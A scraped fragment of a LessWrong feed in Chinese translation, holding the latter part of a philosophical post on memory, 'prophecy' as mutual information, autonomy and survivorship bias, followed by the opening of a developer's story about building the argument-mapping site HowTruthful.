@font-face {font-family: MJXc-TeX-size1-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size1-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size2-R; src: local('MathJax_Size2'), local('MathJax_Size2-Regular')}
@font-face {font-family: MJXc-TeX-size2-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size2-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size3-R; src: local('MathJax_Size3'), local('MathJax_Size3-Regular')}
@font-face {font-family: MJXc-TeX-size3-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size3-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size4-R; src: local('MathJax_Size4'), local('MathJax_Size4-Regular')}
@font-face {font-family: MJXc-TeX-size4-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size4-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-R; src: local('MathJax_Vector'), local('MathJax_Vector-Regular')}
@font-face {font-family: MJXc-TeX-vec-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-B; src: local('MathJax_Vector Bold'), local('MathJax_Vector-Bold')}
@font-face {font-family: MJXc-TeX-vec-Bx; src: local('MathJax_Vector'); font-weight: bold}
@font-face {font-family: MJXc-TeX-vec-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Bold.otf') format('opentype')}
</style></p><p>A可以有关于多个B的记忆，或者关于B的不同时刻的记忆。它也可以有关于自身的记忆，换句话说，A可以等于B。</p><p><strong>预言</strong>是 A 的当前状态与 B 的未来状态之间的互信息：</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(A,B,t)=I(A(t_0);B(t)), &nbsp; t>t_0"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.151em; padding-bottom: 0.519em;">;</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">>;</span></span> <span class="mjx-msubsup MJXc-space3"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span></span></span></span></span></span></p><p>显然，在知道B的未来状态之前，这个预言不会得到证实。</p><p>预言可以是对未来的预测，也可以是控制/影响未来的行动。用<a href="https://direct.mit.edu/books/oa-monograph/5299/Active-InferenceThe-Free-Energy-Principle-in-Mind">主动推理</a>模型的语言来说，它要么是“改变我的模型”，要么是“改变世界”。</p><p>没有必要偏爱一种解释，因为在不同的情况下可以得出不同的解释，这将在后面的章节中解释。 </p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/o2ncra8iua87bucaqcjj" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/x59yo9gi6m2t6lhwmi4m 190w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/hinefdk6aqt85he60f7n 380w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/y635sfgtqts4yyi8lnm0 570w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/idxrp4jnif7jwlvnp0l3 760w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/stfkrzvpadgosu4ultrj 950w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wrus6qunfzdxmf8t0h24 1140w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ftbc9xidqv4bbsivwmui 1330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/pu87jg7dx4jmmu0j8uqj 1520w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wlak3vxqi8f5r7eqsiho 1710w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ccppmmekugmfbg2ufvyl 1826w"><br><i>图2：对象A可以同时拥有关于对象B的记忆和预言。</i><br></p><h2><strong>收集预言的记忆</strong></h2><p>我们不会感到惊讶地发现，大多数（如果不是全部）对物体 A 有预言的物体也有关于它的记忆，尽管反过来并不总是正确的。我们可以推测，关于未来的信息来自于关于过去的信息。</p><p>例如，如果您知道月球过去的位置和速度，您就可以获得有关其未来位置和速度的大量信息。</p><p>并非所有信息都是一样的。以我们的月球为例，有关其位置和相位的信息包含更多有关其未来的信息，而咖啡杯中的泡沫图案包含的信息较少。</p><p> <i>（虽然计算能力在处理从记忆到预测或控制的信息方面发挥着重要作用，但我们只考虑预言的上限，就好像我们拥有无限的计算能力一样。）</i></p><p>具有不同记忆的物体对于同一个物体会有不同的预言。例如，天文学家和占星家由于对宇宙的了解不同，对火星的未来会有不同的信息。</p><p>智能需要预言才能生存和发展，因为为了维持其动态平衡并实现其目标，它需要关于未来的足够信息，尤其是关于它自己的未来。为了获得关于自己的预言，一个人应该收集关于自己和世界的记忆，这些记忆有助于预测或控制自己的未来。<br></p><h2><strong>自治与他律</strong></h2><p>我们可以通过一个物体对自己的未来有多少预言来衡量它的<strong>自治程度</strong>，这表明它的自治性和独立性。</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="D_a(A,t) = P(A(t_0),A(t))"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">D</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mi" style=""><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">a</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p>同样，我们可以通过B对A的预言程度来衡量对象A相对于对象B的<strong>他律程度</strong>，即A对B的依赖程度。</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="D_h(A,B,t) = P(B(t_0),A(t))"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">D</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.219em; padding-right: 0.071em;"><span class="mjx-mi" style=""><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">h</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p>具有相当大自主权的对象可以被视为<strong>个人</strong>或代理人。永久丧失自主权就是一个人的<strong>死亡</strong>。死亡通常是基本记忆永久丧失的结果，这些记忆可以引发关于死亡的预言。</p><p>关注不同类型的信息需要不同的自主和死亡标准。例如，人类神经元对其新陈代谢有一定的自主权，但其动作电位的时间和强度主要取决于其他神经元。我们可以把它想象成一个个体，但在研究智力时最好把它想象成个体的一部分。因为单个神经元的死亡对人的自主性影响不大，但人的死亡却有影响。 </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/u5iafy5zmbajbwnztx6x" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/exjglmd0smykwlmgxr06 90w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/driduuta9smhjpxi84cz 180w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jb39pddgzba0p2ya55ha 270w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/fnrcz0hbic1mcbzrdhqr 360w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/v7dnlmjix92met7iwjrg 450w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jxjcatvrkfwpgktsnvvl 540w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wa7tr6yqbqt66ibdimvm 630w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/iyyybo5vbp6qlxy9j0s3 720w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ncyautqo9hktff32phyo 810w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/avjpr3xr37wzdugycayo 876w"></figure><p><i>图 3：自治与他律</i><br></p><h2><strong>心灵的法则</strong></h2><p>随着个体积累越来越多的记忆和预言，它可以发现世界的一般规则，即过去与未来之间的关系。</p><p>在这个规则学习过程中，自我与外部世界之间的界限出现了。人们不可避免地会发现<strong> </strong><i>世界上的某些部分遵循与其他部分不同的规则</i>，并且这些特殊部分在空间上集中在其自身周围。我们可以将这个特殊的部分称为<strong>身体</strong>。</p><p>例如，一个人可能承认自己的体温从未很高，例如超过 1000K，并预测如果其未来受到控制，其身体将永远不会经历超过 1000K 的温度。由于其他一些物体的温度可以达到1000K，因此可以得出结论，必须有一些特殊的规则来防止人体变得太热。我们将这些规则称为目标、动机或情感等。</p><p>直观的结论是，你的身体遵循一些与其他物体遵循的规则不同的规则。这就是人们所说的二元论：身体遵循<strong>心灵的法则</strong>，心灵使用目标、情感、逻辑等概念，而外部世界则不然。</p><p>然而，身体与环境之间的确切界限并不十分清楚。身体周围的空间可能部分遵循心灵法则，可以称为<strong>个人周围空间</strong>，这是一个借用心理学的术语。</p><p> <i>（仔细观察会发现，身体和个人周围空间也遵循与外界相同的科学定律，而心灵法则是一些只有身体才遵循的附加法则。）</i> </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/yglpx2i2jgom0dug2hdn" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/sy4goovwhu18e6ihgjwd 130w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ebgk6j4s88unhlkj1w0t 260w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/rwucnxeytevi4b7zqtqz 390w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jae02t6duleubcepc99x 520w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/qtu9k0c6qalzb91dajne 650w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/xmmmksiszxivbcvurwtu 780w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/isnkects4ie5oig7lqvz 910w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dhdzjgi7xyhavkko1ped 1040w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/rwdgxtvtbhpoomms5nzv 1170w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/zglq0qd96yfufjeggva5 1246w"></figure><p><i>图 4：宇宙中的一切都遵循物理定律，此外，人的身体和个人空间也遵循心灵定律。</i></p><h2><br><strong>二元论和生存偏见</strong></h2><p>如果我们的身体是由与外界相同的原子构成的，为什么我们的身体似乎遵循心灵法则呢？</p><p>考虑一个生存偏差的典型例子。第二次世界大战期间，统计学家<a href="https://en.wikipedia.org/wiki/Survivorship_bias#Military">亚伯拉罕·沃尔德检查了返航飞机的弹孔</a>，并建议在受损最小的区域增加装甲，因为在这些区域受损的大多数飞机都无法安全返回基地。</p><p>这种生存偏差可以通过在战场上而不是在基地观察飞机来克服，在那里我们可以发现弹孔均匀分布在整个飞机上，因为观察者的生存与弹孔的位置无关。因为当观察者的生存不独立于观察到的事件时，就会引入生存偏差。</p><p>我们可以推测，如果一个事件原则上依赖于观察者自身的生存，就会存在无法克服的生存偏差。例如，自己的体温并不独立于自己的生存，但他人的体温却可以。</p><p>与返回飞机上的弹孔图案不同，固有的生存偏差，包括如何生存的大量经验，可以在观察者的记忆中积累，就像飞机关键区域增加的装甲一样。我们把积累的生存偏差的记忆称为<strong>内在记忆</strong>，将生存偏差可以克服的外部世界的记忆称为<strong>外在记忆</strong>。</p><p>心灵法则，例如目标导向机制，可以从内在记忆中导出。观察者可能会发现，（几乎）外界的一切都有原因，但其自身目标驱动的生存机制，例如厌恶高温，或增强装甲，除了“自身生存”的规则外，没有任何原因。取决于自身的生存”，或者说是自身的存在。然后观察者得出结论：我有一个目标，我已经做出了选择。</p><p><br><br><br></p><br/><br/> <a href="https://www.lesswrong.com/posts/FRd6nNj3M33w2CSX5/aci-6-a-non-dualistic-aci-model#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/FRd6nNj3M33w2CSX5/aci-6-a-non-dualistic-aci-model<guid ispermalink="false"> FRd6nNj3M33w2CSX5</guid><dc:creator><![CDATA[Akira Pyinya]]></dc:creator><pubDate> Fri, 10 Nov 2023 00:42:39 GMT</pubDate> </item><item><title><![CDATA[How I got so excited about HowTruthful]]></title><description><![CDATA[Published on November 9, 2023 6:49 PM GMT<br/><br/><p>这是<i>我制作的关于我当前全职项目的</i><a href="https://www.youtube.com/watch?v=XqoJAyihJ_c"><i>视频</i></a><i>的脚本</i>。<i>我认为 LW 社区会比我交谈过的普通人更好地理解它的价值。</i></p><p>嗨，我是布鲁斯·刘易斯。我是一名计算机程序员。很长一段时间以来，我一直对计算机如何帮助人们处理信息着迷。最近，我一直在思考和尝试计算机帮助人们处理推理的方法。该视频将让您了解引导我走向 HowTruthful 的一系列想法和实验，并告诉您为什么我对此感到兴奋。这将是一个很长的视频，但如果您对人们如何得出真理感兴趣，那么这是值得的。</p><p>十或十五年前，我注意到在线讨论论坛确实不能很好地说服人们相信你的论点。人们不关注事实，反而偏离主题、进行人身攻击、原地踏步。你很少看到有人根据新证据改变主意。</p><p>这让我思考什么可能是比帖子、评论和争论回复更好的格式。我认为每个陈述都是它自己的事情，并且陈述将通过一个陈述是否支持或反对另一个陈述而联系起来。如果你重复一个声明，它会使用现有的东西而不是创建一个新的东西，这样更容易避免陷入循环。这会鼓励人们专注于手头的话题，而不是分心。</p><p>我一直把这个想法记在心里，但并没有采取任何行动。</p><p>几年后，我对推特的成功感到困惑。当时它唯一的显着特点是限制为 140 个字符。大家都抱怨这个。但我开始认为极限是其成功的秘诀。是的，您的字符数限制为 140 个字符，这确实很痛苦。你必须努力让你想说的话足够简洁、合适。但最棒的是，其他人也必须努力保持简洁。</p><p>因此，强制简洁的想法在我的脑海中浮现，并开始与我的另一个想法混合在一起，即一种有助于人们保持注意力的论证格式。然后第三个想法加入了他们，让人们在准备改变主意时能够快速、轻松地改变主意。</p><p> 2018年，当我国的政治讨论变得非常两极分化时，这三个想法出现在我的脑海中，我开始认真研究它们。或者，我应该说，在业余时间尽可能认真地研究它们，同时从事一份不相关的日常工作。我确实在我购买的域名 howtruthful.com 上获得了一个工作版本，但它没有得到关注。</p><p>然后今年一月，我收到雇主发来的一封电子邮件，说他们正在裁员，我的角色受到了影响。我的雇佣关系将于 9 个月后的 10 月 27 日结束。我对此进行了一系列回应。首先我有一种沉沦的感觉，而且似乎不真实。后来，当我查看了遣散费和在退出日期之前呆满 9 个月的奖金后，我觉得这一切都很棒。我将有足够的钱全职工作几个月，从事我认为有价值的项目，比如 HowTruthful。几个月后，我产生了挥之不去的疑虑。也许我应该找个调动职位而不是离开我的雇主。</p><p>在这个重大的职业决定中，我考虑了很多因素，我约见了三位有创业经验的志愿者职业教练。我遇到了第一个并解释了我的困境，但没有说任何关于 HowTruthful 的事情。他专心听着，然后说道：“这不是我能为你做决定的事情。这是我建议你做的。拿一张纸，写下留在这里的所有利弊，看看这个决定是否有效。”明显的。”</p><p>我忍不住笑出声来。然后我告诉他，我正在考虑全职从事的项目是一个组织利弊的项目。但我采纳了他的建议，结果就<a href="https://en.howtruthful.com/o/i_should_stay_with_my_employer/29f76168a4a697c41ff49c685f5e426e">在这里</a>。</p><p>这是 HowTruthful 上的意见页面。意见由三部分组成：顶部的主要陈述，真实性评级，即编号为 1 到 5 的彩色圆圈，然后是赞成和反对的证据。对于那些之前没有看过 HowTruthful 